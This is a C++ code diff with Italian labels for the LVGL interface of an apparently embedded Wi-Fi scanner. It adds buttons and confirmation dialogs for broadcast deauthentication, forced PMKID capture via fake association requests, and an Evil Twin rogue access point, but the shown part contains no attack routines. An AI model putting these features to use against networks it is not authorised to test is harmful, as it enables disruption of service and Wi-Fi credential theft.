+    lv_obj_set_style_pad_all(gridContainer, 0, 0);
+    lv_obj_set_style_pad_column(gridContainer, 4, 0);
+    lv_obj_set_style_pad_row(gridContainer, 4, 0);
+    lv_obj_set_style_border_width(gridContainer, 0, 0);
+    lv_obj_set_style_bg_opa(gridContainer, LV_OPA_TRANSP, 0);
+    lv_obj_remove_flag(gridContainer, LV_OBJ_FLAG_SCROLLABLE);
+
+    // 1. Client associati (48%)
+    ctx->detailClientsButton = lv_button_create(gridContainer);
+    lv_obj_set_width(ctx->detailClientsButton, LV_PCT(48));
+    lv_obj_set_height(ctx->detailClientsButton, LV_SIZE_CONTENT);
+    lv_obj_set_style_pad_ver(ctx->detailClientsButton, 6, 0);
+    lv_obj_set_style_radius(ctx->detailClientsButton, 4, 0);
+    lv_obj_set_style_border_width(ctx->detailClientsButton, 1, 0);
+    lv_obj_set_style_border_color(ctx->detailClientsButton, lv_color_hex(0x505050), 0);
+    lv_obj_set_style_bg_color(ctx->detailClientsButton, lv_color_hex(0x181818), 0);
+    lv_obj_set_style_bg_opa(ctx->detailClientsButton, LV_OPA_COVER, 0);
+    lv_obj_add_flag(ctx->detailClientsButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
+    auto* cliLbl = lv_label_create(ctx->detailClientsButton);
+    lv_label_set_text(cliLbl, LV_SYMBOL_LIST " Client (0)");
+    lv_obj_center(cliLbl);
+    lv_obj_add_event_cb(ctx->detailClientsButton, onShowClients, LV_EVENT_CLICKED, ctx);
+
+    if (isCaptureSupported()) {
+        // 2. Channel Lock (48%)
+        ctx->detailLockButton = lv_button_create(gridContainer);
+        lv_obj_set_width(ctx->detailLockButton, LV_PCT(48));
+        lv_obj_set_height(ctx->detailLockButton, LV_SIZE_CONTENT);
+        lv_obj_set_style_pad_ver(ctx->detailLockButton, 6, 0);
+        lv_obj_set_style_radius(ctx->detailLockButton, 4, 0);
+        lv_obj_set_style_border_width(ctx->detailLockButton, 1, 0);
+        lv_obj_set_style_border_color(ctx->detailLockButton, lv_color_hex(0x505050), 0);
+        lv_obj_set_style_bg_color(ctx->detailLockButton, lv_color_hex(0x181818), 0);
+        lv_obj_set_style_bg_opa(ctx->detailLockButton, LV_OPA_COVER, 0);
+        lv_obj_add_flag(ctx->detailLockButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
+        auto* lockLbl = lv_label_create(ctx->detailLockButton);
+        lv_label_set_text(lockLbl, "Channel Lock");
+        lv_obj_center(lockLbl);
+        lv_obj_add_event_cb(ctx->detailLockButton, onToggleLock, LV_EVENT_CLICKED, ctx);
+
+        // 3. Deauth ALL (48%)
+        ctx->detailDeauthButton = lv_button_create(gridContainer);
+        lv_obj_set_width(ctx->detailDeauthButton, LV_PCT(48));
+        lv_obj_set_height(ctx->detailDeauthButton, LV_SIZE_CONTENT);
+        lv_obj_set_style_pad_ver(ctx->detailDeauthButton, 6, 0);
+        lv_obj_set_style_radius(ctx->detailDeauthButton, 4, 0);
+        lv_obj_set_style_border_width(ctx->detailDeauthButton, 1, 0);
+        lv_obj_set_style_border_color(ctx->detailDeauthButton, lv_color_hex(0x505050), 0);
+        lv_obj_set_style_bg_color(ctx->detailDeauthButton, lv_color_hex(0xB33A3A), 0);
+        lv_obj_set_style_bg_opa(ctx->detailDeauthButton, LV_OPA_COVER, 0);
+        lv_obj_add_flag(ctx->detailDeauthButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
+        auto* deauthLbl = lv_label_create(ctx->detailDeauthButton);
+        lv_label_set_text(deauthLbl, LV_SYMBOL_WARNING " Deauth ALL");
+        lv_obj_center(deauthLbl);
+        lv_obj_add_event_cb(ctx->detailDeauthButton, onDeauthPressed, LV_EVENT_CLICKED, ctx);
+
+        // 4. Trigger PMKID (48%)
+        ctx->detailPmkidButton = lv_button_create(gridContainer);
+        lv_obj_set_width(ctx->detailPmkidButton, LV_PCT(48));
+        lv_obj_set_height(ctx->detailPmkidButton, LV_SIZE_CONTENT);
+        lv_obj_set_style_pad_ver(ctx->detailPmkidButton, 6, 0);
+        lv_obj_set_style_radius(ctx->detailPmkidButton, 4, 0);
+        lv_obj_set_style_border_width(ctx->detailPmkidButton, 1, 0);
+        lv_obj_set_style_border_color(ctx->detailPmkidButton, lv_color_hex(0x505050), 0);
+        lv_obj_set_style_bg_color(ctx->detailPmkidButton, lv_color_hex(0x2E7D32), 0);
+        lv_obj_set_style_bg_opa(ctx->detailPmkidButton, LV_OPA_COVER, 0);
+        lv_obj_add_flag(ctx->detailPmkidButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
+        auto* pmkidLbl = lv_label_create(ctx->detailPmkidButton);
+        lv_label_set_text(pmkidLbl, LV_SYMBOL_WIFI " PMKID");
+        lv_obj_center(pmkidLbl);
+        lv_obj_add_event_cb(ctx->detailPmkidButton, [](lv_event_t* e) {
+            auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
+            char ssid[33] = {};
+            bool found = false;
+            if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
+                auto it = ctx->seen.find(ctx->selectedKey);
+                if (it != ctx->seen.end()) {
+                    strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
+                    found = true;
+                }
+                ctx->mutex.unlock();
+            }
+            if (!found) return;
+            char msg[160];
+            snprintf(msg, sizeof(msg), "Invia Fake Association Request a \"%s\"\nper forzare e catturare il PMKID?",
+                ssid[0] != '\0' ? ssid : "(nascosta)");
+            ctx->pmkidDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Trigger PMKID", msg, { "Invia", "Annulla" });
+        }, LV_EVENT_CLICKED, ctx);
+    }
+
+    // Contenitore griglia per Evil Twin e Dettagli ET affiancati
+    auto* etGridContainer = lv_obj_create(scroll);
+    lv_obj_set_width(etGridContainer, LV_PCT(100));
+    lv_obj_set_height(etGridContainer, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(etGridContainer, LV_FLEX_FLOW_ROW_WRAP);
+    lv_obj_set_style_pad_all(etGridContainer, 0, 0);
+    lv_obj_set_style_pad_column(etGridContainer, 4, 0);
+    lv_obj_set_style_pad_row(etGridContainer, 4, 0);
+    lv_obj_set_style_border_width(etGridContainer, 0, 0);
+    lv_obj_set_style_bg_opa(etGridContainer, LV_OPA_TRANSP, 0);
+    lv_obj_remove_flag(etGridContainer, LV_OBJ_FLAG_SCROLLABLE);
+
+    if (isCaptureSupported()) {
+        // 5. Evil Twin (48%)
+        ctx->detailEvilTwinButton = lv_button_create(etGridContainer);
+        lv_obj_set_width(ctx->detailEvilTwinButton, LV_PCT(48));
+        lv_obj_set_height(ctx->detailEvilTwinButton, LV_SIZE_CONTENT);
+        lv_obj_set_style_pad_ver(ctx->detailEvilTwinButton, 6, 0);
+        lv_obj_set_style_radius(ctx->detailEvilTwinButton, 4, 0);
+        lv_obj_set_style_border_width(ctx->detailEvilTwinButton, 1, 0);
+        lv_obj_set_style_border_color(ctx->detailEvilTwinButton, lv_color_hex(0x505050), 0);
+        lv_obj_set_style_bg_color(ctx->detailEvilTwinButton, lv_color_hex(0xD97706), 0);
+        lv_obj_set_style_bg_opa(ctx->detailEvilTwinButton, LV_OPA_COVER, 0);
+        lv_obj_add_flag(ctx->detailEvilTwinButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
+        auto* etLbl = lv_label_create(ctx->detailEvilTwinButton);
+        lv_label_set_text(etLbl, LV_SYMBOL_WARNING " Evil Twin");
+        lv_obj_center(etLbl);
+        lv_obj_add_event_cb(ctx->detailEvilTwinButton, [](lv_event_t* e) {
+            auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
+            char ssid[33] = {};
+            bool active = false;
+            if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
+                auto it = ctx->seen.find(ctx->selectedKey);
+                if (it != ctx->seen.end()) {
+                    strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
+                }
+                active = ctx->evilTwinActive;
+                ctx->mutex.unlock();
+            }
+            char msg[160];
+            if (!active) {
+                snprintf(msg, sizeof(msg), "Attivare Evil Twin Rogue AP per \"%s\"?\nClonera l'SSID e avviera il deauth broadcast.",
+                    ssid[0] != '\0' ? ssid : "(nascosta)");
+            } else {
+                snprintf(msg, sizeof(msg), "Disattivare l'Evil Twin Rogue AP?");
+            }
+            ctx->evilTwinDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Evil Twin", msg, { active ? "Disattiva" : "Attiva", "Annulla" });
+        }, LV_EVENT_CLICKED, ctx);
+
+        // 6. Dettagli ET (48% - accanto a Evil Twin)
+        ctx->detailEvilTwinDetailsButton = lv_button_create(etGridContainer);
+        lv_obj_set_width(ctx->detailEvilTwinDetailsButton, LV_PCT(48));
+        lv_obj_set_height(ctx->detailEvilTwinDetailsButton, LV_SIZE_CONTENT);
+        lv_obj_set_style_pad_ver(ctx->detailEvilTwinDetailsButton, 6, 0);
+        lv_obj_set_style_radius(ctx->detailEvilTwinDetailsButton, 4, 0);
+        lv_obj_set_style_border_width(ctx->detailEvilTwinDetailsButton, 1, 0);
+        lv_obj_set_style_border_color(ctx->detailEvilTwinDetailsButton, lv_color_hex(0x505050), 0);
+        lv_obj_set_style_bg_color(ctx->detailEvilTwinDetailsButton, lv_color_hex(0x181818), 0);
+        lv_obj_set_style_bg_opa(ctx->detailEvilTwinDetailsButton, LV_OPA_COVER, 0);
+        lv_obj_add_flag(ctx->detailEvilTwinDetailsButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
+        auto* etDetLbl = lv_label_create(ctx->detailEvilTwinDetailsButton);
+        lv_label_set_text(etDetLbl, LV_SYMBOL_SETTINGS " Dettagli ET");
+        lv_obj_center(etDetLbl);
+        lv_obj_add_event_cb(ctx->detailEvilTwinDetailsButton, onShowEvilTwinDetail, LV_EVENT_CLICKED, ctx);
+
+        auto* hsCard = createSectionCard(scroll, "Stato Cattura Handshake / PMKID");
+        ctx->detailHsSummary = lv_label_create(hsCard);
+        lv_label_set_text(ctx->detailHsSummary, "Stato -> HS: 0/4 | PMKID: NO");
+        lv_obj_set_width(ctx->detailHsSummary, LV_PCT(100));
+    }
+
+    // 2. Schede informative con titolo in azzurro
+    auto* idCard = createSectionCard(scroll, "Informazioni Rete");
+    ctx->detailSsidLabel = lv_label_create(idCard);
+    ctx->detailMacLabel = lv_label_create(idCard);
+
+    auto* secCard = createSectionCard(scroll, "Sicurezza e Canale");
+    ctx->detailSecLabel = lv_label_create(secCard);
+    ctx->detailChanLabel = lv_label_create(secCard);
+
+    auto* sigCard = createSectionCard(scroll, "Segnale e Distanza");
+    ctx->detailPowerLabel = lv_label_create(sigCard);
+    ctx->detailPhyLabel = lv_label_create(sigCard);
+
+    auto* techCard = createSectionCard(scroll, "Statistiche e Attivita");
+    ctx->detailTimeLabel = lv_label_create(techCard);
+    ctx->detailDeauthLabel = lv_label_create(techCard);
+
+    for (auto* lbl : {ctx->detailSsidLabel, ctx->detailMacLabel, ctx->detailSecLabel, ctx->detailChanLabel, ctx->detailPowerLabel, ctx->detailPhyLabel, ctx->detailTimeLabel, ctx->detailDeauthLabel}) {
+        if (lbl) {
+            lv_obj_set_width(lbl, LV_PCT(100));
+            lv_label_set_long_mode(lbl, LV_LABEL_LONG_MODE_WRAP);
+            lv_obj_set_style_pad_all(lbl, 0, 0);
+        }
+    }
+
+    // 3. Pulsante Connetti in fondo
+    ctx->connectButton = lv_button_create(scroll);
+    lv_obj_set_width(ctx->connectButton, LV_PCT(100));
+    lv_obj_set_height(ctx->connectButton, LV_SIZE_CONTENT);
+    lv_obj_set_style_pad_ver(ctx->connectButton, 8, 0);
+    lv_obj_set_style_radius(ctx->connectButton, 4, 0);
+    lv_obj_set_style_border_width(ctx->connectButton, 1, 0);
+    lv_obj_set_style_border_color(ctx->connectButton, lv_color_hex(0x505050), 0);
+    lv_obj_set_style_bg_color(ctx->connectButton, lv_color_hex(0x181818), 0);
+    lv_obj_set_style_bg_opa(ctx->connectButton, LV_OPA_COVER, 0);
+    lv_obj_add_flag(ctx->connectButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
+    auto* connLbl = lv_label_create(ctx->connectButton);
+    lv_label_set_text(connLbl, LV_SYMBOL_WIFI " Connetti");
+    lv_obj_center(connLbl);
+    lv_obj_add_event_cb(ctx->connectButton, onConnectPressed, LV_EVENT_CLICKED, ctx);
+}
+
+void createClientsPage(Context* ctx, lv_obj_t* parent) {
+    ctx->clientsPage = createPage(parent);
+    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
+
+    auto* header = lv_obj_create(ctx->clientsPage);
+    lv_obj_set_size(header, LV_PCT(100), 18);
+    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_all(header, 2, 0);
+    lv_obj_set_style_pad_column(header, 4, 0);
+    lv_obj_set_style_border_width(header, 0, 0);
+    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);
+
+    auto* macHdr = lv_label_create(header);
+    lv_label_set_text(macHdr, "Client (MAC)");
+    lv_obj_set_flex_grow(macHdr, 1);
+
+    addLegendLabel(header, "dBm", COL_CDBM);
+    addLegendLabel(header, "TX", COL_TX);
+    addLegendLabel(header, "RX", COL_RX);
+
+    auto* indHdr = lv_label_create(header);
+    lv_obj_set_width(indHdr, COL_IND);
+    lv_label_set_text(indHdr, "");
+
+    ctx->clientsList = lv_list_create(ctx->clientsPage);
+    lv_obj_set_width(ctx->clientsList, LV_PCT(100));
+    lv_obj_set_flex_grow(ctx->clientsList, 1);
+    lv_obj_set_style_pad_all(ctx->clientsList, 0, 0);
+    lv_obj_set_style_pad_row(ctx->clientsList, 2, 0);
+}
+
+void createGraphPage(Context* ctx, lv_obj_t* parent) {
+    ctx->graphPage = createPage(parent);
+
+    auto* mainRow = lv_obj_create(ctx->graphPage);
+    lv_obj_set_size(mainRow, LV_PCT(100), LV_PCT(100));
+    lv_obj_set_flex_flow(mainRow, LV_FLEX_FLOW_ROW);
+    lv_obj_set_style_pad_all(mainRow, 0, 0);
+    lv_obj_set_style_pad_column(mainRow, 4, 0);
+    lv_obj_set_style_border_width(mainRow, 0, 0);
+    lv_obj_remove_flag(mainRow, LV_OBJ_FLAG_SCROLLABLE);
+
+    auto* leftColumn = lv_obj_create(mainRow);
+    lv_obj_set_flex_flow(leftColumn, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_height(leftColumn, LV_PCT(100));
+    lv_obj_set_flex_grow(leftColumn, 1);
+    lv_obj_set_style_pad_all(leftColumn, 0, 0);
+    lv_obj_set_style_border_width(leftColumn, 0, 0);
+    lv_obj_remove_flag(leftColumn, LV_OBJ_FLAG_SCROLLABLE);
+
+    ctx->statusLabel = lv_label_create(leftColumn);
+    lv_label_set_text(ctx->statusLabel, "...");
+    lv_obj_set_width(ctx->statusLabel, LV_PCT(100));
+
+    auto* chartWrapper = lv_obj_create(leftColumn);
+    lv_obj_set_width(chartWrapper, LV_PCT(100));
+    lv_obj_set_flex_grow(chartWrapper, 1);
+    lv_obj_set_style_pad_all(chartWrapper, 0, 0);
+    lv_obj_set_style_border_width(chartWrapper, 0, 0);
+    lv_obj_remove_flag(chartWrapper, LV_OBJ_FLAG_SCROLLABLE);
+
+    ctx->chart = lv_chart_create(chartWrapper);
+    lv_obj_set_size(ctx->chart, LV_PCT(100), LV_PCT(100));
+    lv_obj_set_style_pad_all(ctx->chart, 0, 0);
+    lv_chart_set_type(ctx->chart, LV_CHART_TYPE_LINE);
+    lv_chart_set_point_count(ctx->chart, CHART_POINTS);
+    lv_chart_set_axis_range(ctx->chart, LV_CHART_AXIS_PRIMARY_Y, 0, SIGNAL_RANGE_DB);
+    lv_chart_set_div_line_count(ctx->chart, 3, 0);
+    lv_obj_set_style_size(ctx->chart, 0, 0, LV_PART_INDICATOR);
+    lv_obj_set_style_line_width(ctx->chart, 2, LV_PART_ITEMS);
+    lv_obj_remove_flag(ctx->chart, LV_OBJ_FLAG_SCROLLABLE);
+    for (int i = 0; i < MAX_SERIES; i++) {
+        ctx->series[i] = lv_chart_add_series(ctx->chart, lv_color_hex(SERIES_COLORS[i]), LV_CHART_AXIS_PRIMARY_Y);
+        lv_chart_hide_series(ctx->chart, ctx->series[i], true);
+    }
+
+    createChannelGrid(chartWrapper);
+
+    ctx->labelLayer = lv_obj_create(chartWrapper);
+    lv_obj_set_size(ctx->labelLayer, LV_PCT(100), LV_PCT(100));
+    lv_obj_set_style_pad_all(ctx->labelLayer, 0, 0);
+    lv_obj_set_style_bg_opa(ctx->labelLayer, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(ctx->labelLayer, 0, 0);
+    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_CLICKABLE);
+
+    createAxisLabels(leftColumn);
+
+    constexpr int BTN = 40;
+    auto* rightColumn = lv_obj_create(mainRow);
+    lv_obj_set_size(rightColumn, BTN, LV_PCT(100));
+    lv_obj_set_flex_flow(rightColumn, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_style_pad_all(rightColumn, 0, 0);
+    lv_obj_set_style_pad_row(rightColumn, 4, 0);
+    lv_obj_set_style_border_width(rightColumn, 0, 0);
+    lv_obj_remove_flag(rightColumn, LV_OBJ_FLAG_SCROLLABLE);
+
+    ctx->scanButton = createIconButton(rightColumn, LV_SYMBOL_WIFI, onStartScan, ctx, BTN);
+    ctx->captureButton = createIconButton(rightColumn, "CH", onStartCapture, ctx, BTN);
+    ctx->stopButton = createIconButton(rightColumn, LV_SYMBOL_STOP, onStop, ctx, BTN);
+    createIconButton(rightColumn, LV_SYMBOL_LIST, onShowList, ctx, BTN);
+    refreshModeButtons(ctx);
+}
+
+void createListPage(Context* ctx, lv_obj_t* parent) {
+    ctx->listPage = createPage(parent);
+    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
+
+    auto* header = lv_obj_create(ctx->listPage);
+    lv_obj_set_size(header, LV_PCT(100), 18);
+    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_all(header, 2, 0);
+    lv_obj_set_style_pad_column(header, 4, 0);
+    lv_obj_set_style_border_width(header, 0, 0);
+    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);
+    auto* spacer = lv_obj_create(header);
+    lv_obj_set_size(spacer, 6, 1);
+    lv_obj_set_style_border_width(spacer, 0, 0);
+    lv_obj_set_style_bg_opa(spacer, LV_OPA_TRANSP, 0);
+    auto* nameHdr = lv_label_create(header);
+    lv_label_set_text(nameHdr, "Rete");
+    lv_obj_set_flex_grow(nameHdr, 1);
+    addLegendLabel(header, "ch", COL_CH);
+    addLegendLabel(header, "d/s", COL_POWER);
+    addLegendLabel(header, "sec", COL_SEC);
+    addLegendLabel(header, "cli", COL_CLI);
+
+    ctx->list = lv_list_create(ctx->listPage);
+    lv_obj_set_width(ctx->list, LV_PCT(100));
+    lv_obj_set_flex_grow(ctx->list, 1);
+    lv_obj_set_style_pad_all(ctx->list, 0, 0);
+    lv_obj_set_style_pad_row(ctx->list, 2, 0);
+}
+
+void showPage(Context* ctx, Page page) {
+    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
+        ctx->page = page;
+        ctx->mutex.unlock();
+    }
+
+    lv_obj_add_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
+    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
+    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
+    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
+    lv_obj_add_flag(ctx->etDetailPage, LV_OBJ_FLAG_HIDDEN);
+
+    switch (page) {
+        case Page::Graph:
+            lv_obj_remove_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
+            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "Wi-Fi Scanner");
+            break;
+        case Page::List:
+            lv_obj_remove_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
+            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "Reti rilevate");
+            break;
+        case Page::Detail:
+            lv_obj_remove_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
+            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "Dettaglio rete");
+            if (ctx->detailScroll != nullptr) {
+                lv_obj_scroll_to_y(ctx->detailScroll, 0, LV_ANIM_OFF);
+                if (ctx->detailClientsButton != nullptr) {
+                    lv_group_focus_obj(ctx->detailClientsButton);
+                }
+            }
+            updateDetail(ctx);
+            break;
+        case Page::Clients:
+            lv_obj_remove_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
+            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "Client della rete");
+            for (auto& [k, w] : ctx->clientRows) lv_obj_delete(w);
+            ctx->clientRows.clear();
+            updateClientsPage(ctx);
+            if (ctx->clientsList != nullptr) lv_obj_scroll_to_y(ctx->clientsList, 0, LV_ANIM_OFF);
+            break;
+        case Page::EvilTwinDetail:
+            lv_obj_remove_flag(ctx->etDetailPage, LV_OBJ_FLAG_HIDDEN);
+            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "Evil Twin Log & Client");
+            updateEvilTwinDetailPage(ctx);
+            break;
+    }
+
+    lvgl_toolbar_set_back_override(page == Page::Graph ? nullptr : onHardwareBack, ctx);
+    updateLeds(ctx);
+}
 
 void updateViews(Context* ctx) {
     RadioMode mode;
@@ -1750,7 +2417,6 @@ void updateViews(Context* ctx) {
         return;
     }
 
-    // Stopped means frozen: keep whatever is already on screen, don't touch ctx->seen/clients.
     if (mode == RadioMode::Stopped) return;
 
     if (mode == RadioMode::ActiveScan) {
@@ -1763,17 +2429,17 @@ void updateViews(Context* ctx) {
 
     std::vector<SeenAp> aps;
     std::map<uint64_t, int> clientCounts;
+    std::map<uint64_t, uint32_t> dataTotals;
     size_t clientCount = 0;
     if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
         aps = sortedByRssi(ctx);
         ctx->visible.clear();
         for (const auto& ap : aps) ctx->visible.push_back(bssidKey(ap.record.bssid));
-        // Count only clients still active (seen within the expiry window), so the per-network
-        // count goes down again when a client goes quiet instead of only ever growing.
         uint64_t now = nowMs();
         for (const auto& [clientKey, client] : ctx->clients) {
             if (client.associatedBssid != 0 && now - client.lastSeenMs <= ROW_EXPIRY_MS) {
                 clientCounts[client.associatedBssid]++;
+                dataTotals[client.associatedBssid] += (client.txCount + client.rxCount);
                 clientCount++;
             }
         }
@@ -1817,12 +2483,13 @@ void updateViews(Context* ctx) {
     }
 
     if (page == Page::Graph) updateGraph(ctx, aps);
-    else if (page == Page::List) updateRows(ctx, aps, clientCounts);
+    else if (page == Page::List) updateRows(ctx, aps, clientCounts, dataTotals);
     else if (page == Page::Detail) updateDetail(ctx);
     else if (page == Page::Clients) updateClientsPage(ctx);
+    else if (page == Page::EvilTwinDetail) updateEvilTwinDetailPage(ctx);
     lvgl_unlock();
 
-    updateLeds(ctx); // keep the strip in step (e.g. detail brightness as the signal changes)
+    updateLeds(ctx);
 }
 
 void onTimer(Context* ctx) {
@@ -1839,15 +2506,11 @@ void onTimer(Context* ctx) {
     if (state == Off && mode != RadioMode::Stopped) {
         service::wifi::setEnabled(true);
     } else if (mode == RadioMode::ActiveScan && (state == On || state == ConnectionActive) && !service::wifi::isScanning()) {
-        // Only in active-scan mode: a scan would fight the hopping task for the radio during
-        // capture, and disturb the handshake while a connection is being set up.
         service::wifi::scan();
     }
 
-    if (mode == RadioMode::Capture) flushHandshakes(ctx); // write any ready handshake to SD
+    if (mode == RadioMode::Capture) flushHandshakes(ctx);
 
-    // Checked by window id, not app_scheduler_current_app_id(): this timer callback doesn't run
-    // on the app's own task, so there is no "current app" thread-local to read here.
     if (window_manager_get_state(ctx->window) == WINDOW_STATE_GRANTED) updateViews(ctx);
 }
 
@@ -1863,16 +2526,10 @@ void stopTimer(Context* ctx) {
     if (ledTimer) ledTimer->stop();
 }
 
-// Fast feed for the detail VU bar: pushing the current level continuously keeps the bar steady
-// (a 1 Hz feed would let the meter drain to zero between pushes and flicker).
 void onLedTimer(Context* ctx) {
     if (!ctx->vuFeeding.load()) return;
     int base = ctx->vuLevel.load();
 
-    // "Breath": at each fresh reading the bar swells above the real length, then (with decay on)
-    // eases back to it over ~600 ms, and the peak dot lingers at the swell's top. This is done on
-    // the LENGTH, via setVuLevels, because that always renders (a brightness pulse did not show on
-    // this VU). The strip is horizontal, so the swell runs along it - nothing moves vertically.
     uint32_t sinceRefresh = (uint32_t)lv_tick_get() - ctx->vuRefreshTick.load();
     float swell = sinceRefresh < 600 ? 0.40f * (1.0f - (float)sinceRefresh / 600.0f) : 0.0f;
     int level = base + (int)(base * swell);
@@ -1884,254 +2541,6 @@ void onLedTimer(Context* ctx) {
     service::neopixel::setVuLevels(levels);
 }
 
-// ---- Widget construction ----
-
-lv_obj_t* createPage(lv_obj_t* parent) {
-    auto* page = lv_obj_create(parent);
-    lv_obj_set_flex_flow(page, LV_FLEX_FLOW_COLUMN);
-    lv_obj_set_width(page, LV_PCT(100));
-    lv_obj_set_flex_grow(page, 1);
-    lv_obj_set_style_pad_all(page, 0, 0);
-    lv_obj_set_style_border_width(page, 0, 0);
-    return page;
-}
-
-void createAxisLabels(lv_obj_t* parent) {
-    auto* row = lv_obj_create(parent);
-    lv_obj_set_size(row, LV_PCT(100), 16);
-    lv_obj_set_style_pad_all(row, 0, 0);
-    lv_obj_set_style_border_width(row, 0, 0);
-    lv_obj_remove_flag(row, LV_OBJ_FLAG_SCROLLABLE);
-    for (int channel = 1; channel <= 13; channel++) {
-        char text[4];
-        snprintf(text, sizeof(text), "%d", channel);
-        auto* label = lv_label_create(row);
-        lv_label_set_text(label, text);
-        lv_obj_set_x(label, lv_pct((int)(100 * channelFraction(channel))));
-        lv_obj_set_style_translate_x(label, channel < 10 ? -4 : -8, 0);
-    }
-}
-
-/** Thin vertical reference lines centred on each channel number, so you can read which channel a
- * bell sits on. Placed over the chart, behind the name labels. */
-void createChannelGrid(lv_obj_t* chartWrapper) {
-    for (int channel = 1; channel <= 13; channel++) {
-        auto* line = lv_obj_create(chartWrapper);
-        lv_obj_set_size(line, 1, LV_PCT(100));
-        lv_obj_set_style_border_width(line, 0, 0);
-        lv_obj_set_style_radius(line, 0, 0);
-        lv_obj_set_style_bg_color(line, lv_color_hex(0x606060), 0);
-        lv_obj_set_style_bg_opa(line, LV_OPA_50, 0);
-        lv_obj_remove_flag(line, LV_OBJ_FLAG_SCROLLABLE);
-        lv_obj_remove_flag(line, LV_OBJ_FLAG_CLICKABLE);
-        lv_obj_set_x(line, lv_pct((int)(100 * channelFraction(channel))));
-    }
-}
-
-lv_obj_t* createIconButton(lv_obj_t* parent, const char* icon, lv_event_cb_t callback, Context* ctx, int size = 40) {
-    auto* button = lv_button_create(parent);
-    lv_obj_set_size(button, size, size);
-    lv_obj_set_style_pad_all(button, 0, 0);
-    auto* label = lv_label_create(button);
-    lv_label_set_text(label, icon);
-    lv_obj_center(label);
-    lv_obj_add_event_cb(button, callback, LV_EVENT_SHORT_CLICKED, ctx);
-    return button;
-}
-
-void createGraphPage(Context* ctx, lv_obj_t* parent) {
-    ctx->graphPage = createPage(parent);
-
-    // Everything but the button column lives in the left side, so the buttons never eat into
-    // the chart's own height.
-    auto* mainRow = lv_obj_create(ctx->graphPage);
-    lv_obj_set_size(mainRow, LV_PCT(100), LV_PCT(100));
-    lv_obj_set_flex_flow(mainRow, LV_FLEX_FLOW_ROW);
-    lv_obj_set_style_pad_all(mainRow, 0, 0);
-    lv_obj_set_style_pad_column(mainRow, 4, 0);
-    lv_obj_set_style_border_width(mainRow, 0, 0);
-    lv_obj_remove_flag(mainRow, LV_OBJ_FLAG_SCROLLABLE);
-
-    auto* leftColumn = lv_obj_create(mainRow);
-    lv_obj_set_flex_flow(leftColumn, LV_FLEX_FLOW_COLUMN);
-    lv_obj_set_height(leftColumn, LV_PCT(100));
-    lv_obj_set_flex_grow(leftColumn, 1);
-    lv_obj_set_style_pad_all(leftColumn, 0, 0);
-    lv_obj_set_style_border_width(leftColumn, 0, 0);
-    lv_obj_remove_flag(leftColumn, LV_OBJ_FLAG_SCROLLABLE);
-
-    ctx->statusLabel = lv_label_create(leftColumn);
-    lv_label_set_text(ctx->statusLabel, "...");
-    lv_obj_set_width(ctx->statusLabel, LV_PCT(100));
-
-    auto* chartWrapper = lv_obj_create(leftColumn);
-    lv_obj_set_width(chartWrapper, LV_PCT(100));
-    lv_obj_set_flex_grow(chartWrapper, 1);
-    lv_obj_set_style_pad_all(chartWrapper, 0, 0);
-    lv_obj_set_style_border_width(chartWrapper, 0, 0);
-    lv_obj_remove_flag(chartWrapper, LV_OBJ_FLAG_SCROLLABLE);
-
-    ctx->chart = lv_chart_create(chartWrapper);
-    lv_obj_set_size(ctx->chart, LV_PCT(100), LV_PCT(100));
-    lv_obj_set_style_pad_all(ctx->chart, 0, 0);
-    lv_chart_set_type(ctx->chart, LV_CHART_TYPE_LINE);
-    lv_chart_set_point_count(ctx->chart, CHART_POINTS);
